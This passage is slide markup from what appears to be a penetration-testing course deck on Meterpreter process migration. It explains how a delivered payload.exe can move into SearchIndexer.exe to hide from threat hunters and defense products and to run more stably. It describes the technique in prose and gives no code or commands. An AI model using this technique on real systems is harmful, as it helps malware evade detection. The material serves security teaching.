              <a:sym typeface="Roboto"/>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117"/>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Process Migration Example</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="988" name="Google Shape;988;p117"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4305150" y="649650"/>
            <a:ext cx="827450" cy="3937124"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="989" name="Google Shape;989;p117"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="435425" y="890150"/>
            <a:ext cx="3783900" cy="1493100"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 5880" name="adj"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent2"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="182875" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:noAutofit/>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If you send a payload named </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="dk2"/>
                </a:highlight>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>payload.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t> to a user and they double-click it, the C2 agent process is called </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="dk2"/>
                </a:highlight>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>payload.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>. </a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="990" name="Google Shape;990;p117"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4978725" y="895901"/>
            <a:ext cx="3678900" cy="1493100"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 5178" name="adj"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent2"/>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But migrating to another process, say </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="dk2"/>
                </a:highlight>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>SearchIndexer.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>, conceals the name of the payload.</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="991" name="Google Shape;991;p117"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-12275" y="2673650"/>
            <a:ext cx="4127100" cy="2019600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="0" lIns="457200" spcFirstLastPara="1" rIns="274300" wrap="square" tIns="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>This name is very obvious to threat-</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>hunters inspecting the machine’s active processes. </a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Many defense products will also recognize the name and shut it down.</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="992" name="Google Shape;992;p117"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4598625" y="2673650"/>
            <a:ext cx="4557900" cy="2019600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="0" lIns="365750" spcFirstLastPara="1" rIns="274300" wrap="square" tIns="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="130000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Instead of Meterpreter communicating </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>from the process</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="dk2"/>
                </a:highlight>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>payload.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>, it now communicates from</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="dk2"/>
                </a:highlight>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>SearchIndexer.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>because the contents of</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="dk2"/>
                </a:highlight>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>payload.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>were migrated to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="dk2"/>
                </a:highlight>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>SearchIndexer.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>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118"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="953325" y="3163682"/>
            <a:ext cx="7517100" cy="6276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Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="998" name="Google Shape;998;p118"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="1799925"/>
            <a:ext cx="1045200" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:srgbClr val="2E5E73"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="none"/>
            <a:tailEnd len="med" w="med" type="oval"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="999" name="Google Shape;999;p118"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="2556125"/>
            <a:ext cx="1024500" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:srgbClr val="2E5E73"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="none"/>
            <a:tailEnd len="med" w="med" type="oval"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="1000" name="Google Shape;1000;p118"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5112" y="3367075"/>
            <a:ext cx="1014300" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:srgbClr val="2E5E73"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="none"/>
            <a:tailEnd len="med" w="med" type="oval"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1001" name="Google Shape;1001;p118"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="953325" y="2355257"/>
            <a:ext cx="7517100" cy="6276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Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1002" name="Google Shape;1002;p118"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="953325" y="1609925"/>
            <a:ext cx="7517100" cy="6276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Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1003" name="Google Shape;1003;p118"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1193900" y="1629550"/>
            <a:ext cx="6952500" cy="400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t/>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1004" name="Google Shape;1004;p118"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1193900" y="2348225"/>
            <a:ext cx="6907200" cy="400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t/>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1005" name="Google Shape;1005;p118"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="870800" y="3209210"/>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006" name="Google Shape;1006;p118"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="870800" y="2394122"/>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007" name="Google Shape;1007;p118"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="870800" y="1648472"/>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008" name="Google Shape;1008;p118"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="347250" y="51200"/>
            <a:ext cx="8159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Process Migration </a:t>
            </a:r>
            <a:endParaRPr b="1" i="1" sz="2600">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>In addition to adding a layer of stealth, process migration improves the stability of the process.</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1009" name="Google Shape;1009;p118"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1254001" y="1599825"/>
            <a:ext cx="69966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Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Payloads are often generated for a general OS and architecture, e.g., Windows x64.</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1010" name="Google Shape;1010;p118"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1254011" y="2348225"/>
            <a:ext cx="69966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Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>These payloads do not take into account certain things, such as necessary DLLs in order to run properly.</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1011" name="Google Shape;1011;p118"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1254000" y="3155950"/>
            <a:ext cx="69072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Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>By migrating to another process that Windows has spawned, the payload becomes much more stable.</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>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grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="1016" name="Google Shape;1016;p119"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="447525" y="1449825"/>
            <a:ext cx="776900" cy="486300"/>
            <a:chOff x="457200" y="1466425"/>
            <a:chExt cx="776900" cy="486300"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="1017" name="Google Shape;1017;p119"/>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082D49"/>
                  </a:solidFill>
                  <a:latin typeface="Roboto Light"/>
                  <a:ea typeface="Roboto Light"/>
                  <a:cs typeface="Roboto Light"/>
                  <a:sym typeface="Roboto Light"/>
                </a:rPr>
                <a:t>01</a:t>
              </a:r>
              <a:endParaRPr i="0" sz="3000" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="082D49"/>
                </a:solidFill>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="1018" name="Google Shape;1018;p119"/>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Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="1019" name="Google Shape;1019;p119"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="447525" y="2104680"/>
            <a:ext cx="776900" cy="486300"/>
            <a:chOff x="457200" y="1466425"/>
            <a:chExt cx="776900" cy="486300"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="1020" name="Google Shape;1020;p119"/>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Light"/>
                  <a:ea typeface="Roboto Light"/>
                  <a:cs typeface="Roboto Light"/>
                  <a:sym typeface="Roboto Light"/>
                </a:rPr>
                <a:t>02</a:t>
              </a:r>
              <a:endParaRPr i="0" sz="3000" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="1021" name="Google Shape;1021;p119"/>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Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="1022" name="Google Shape;1022;p119"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="447525" y="2759535"/>
            <a:ext cx="776900" cy="486300"/>
            <a:chOff x="457200" y="1466425"/>
            <a:chExt cx="776900" cy="486300"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="1023" name="Google Shape;1023;p119"/>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Light"/>
                  <a:ea typeface="Roboto Light"/>
                  <a:cs typeface="Roboto Light"/>
                  <a:sym typeface="Roboto Light"/>
                </a:rPr>
                <a:t>03</a:t>
              </a:r>
              <a:endParaRPr i="0" sz="3000" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
